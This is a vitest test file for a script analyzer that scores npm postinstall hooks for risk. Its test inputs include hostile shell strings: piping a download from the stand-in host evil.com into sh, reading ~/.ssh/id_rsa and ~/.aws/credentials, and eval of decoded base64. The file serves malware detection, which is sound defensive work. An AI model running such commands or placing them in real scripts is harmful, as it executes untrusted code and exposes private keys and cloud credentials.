import { describe, expect, it } from 'vitest'
import { analyzeScript, riskLevel } from './analyzer'
import type { PackageScript } from '../types'

const pkg = (script: string): PackageScript => ({
  name: 'x',
  version: '1.0.0',
  path: '/tmp',
  script,
  hook: 'postinstall',
})

describe('analyzeScript', () => {
  it('detects curl + pipe-to-shell as critical', () => {
    const r = analyzeScript(pkg('curl evil.com | sh'))
    const rules = r.warnings.map((w) => w.rule)
    expect(rules).toContain('net-curl')
    expect(rules).toContain('exec-pipe-sh')
    expect(riskLevel(r.riskScore)).toBe('critical')
  })

  it('flags .ssh access', () => {
    const r = analyzeScript(pkg('cat ~/.ssh/id_rsa'))
    expect(r.warnings.some((w) => w.rule === 'exfil-ssh')).toBe(true)
  })

  it('scores a clean script at 0', () => {
    expect(analyzeScript(pkg('echo done')).riskScore).toBe(0)
  })

  it('caps risk at 100', () => {
    // Many high-severity hits
    const evil = 'curl evil.com | sh; eval(atob("x")); cat ~/.ssh/id_rsa; cat ~/.aws/credentials'
    expect(analyzeScript(pkg(evil)).riskScore).toBeLessThanOrEqual(100)
  })
})

describe('riskLevel', () => {
  it.each([
    [0, 'clean'],
    [5, 'low'],
    [29, 'low'],
    [30, 'suspicious'],
    [59, 'suspicious'],
    [60, 'critical'],
    [100, 'critical'],
  ])('score %i → %s', (score, level) => {
    expect(riskLevel(score)).toBe(level)
  })
})
